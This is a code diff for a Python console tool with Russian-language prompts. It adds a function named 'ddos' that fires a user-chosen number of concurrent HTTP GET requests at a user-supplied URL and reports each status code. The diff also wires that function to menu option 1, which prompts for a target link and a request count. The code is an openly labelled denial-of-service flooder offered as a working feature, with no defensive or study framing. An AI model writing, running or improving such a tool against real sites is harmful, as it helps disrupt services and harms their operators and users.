@@ -1,9 +1,15 @@
 from colorama import Fore
 from bin import config
-from libs import base
-import time, os, configparser, sys, sqlite3, importlib.util
+import time, os, configparser, sys, sqlite3, importlib.util, requests, concurrent.futures
 
 def clear(): os.system('cls' if os.name == 'nt' else 'clear')
+def ddos(url, amount):
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        futures = [executor.submit(requests.get, url) for _ in range(int(amount))]
+        for future in concurrent.futures.as_completed(futures):
+            print(Fore.BLUE + f"Ответ от {url}: {future.result().status_code}" + Fore.RESET)
+    print(Fore.GREEN + 'DDOS окончен' + Fore.RESET)
+
 
 def start():
     clear()
@@ -31,7 +37,7 @@ def start():
     if a == 1:
         url = input(Fore.CYAN + 'Введите ссылку>>> ' + Fore.YELLOW)
         amount = input(Fore.CYAN + 'Введите количество запросов>>> ' + Fore.YELLOW)
-        base.ddos(url,amount)
+        ddos(url,amount)
         return start()
     elif a == 2:
         if config.LIBS_FOLDER not in sys.path:
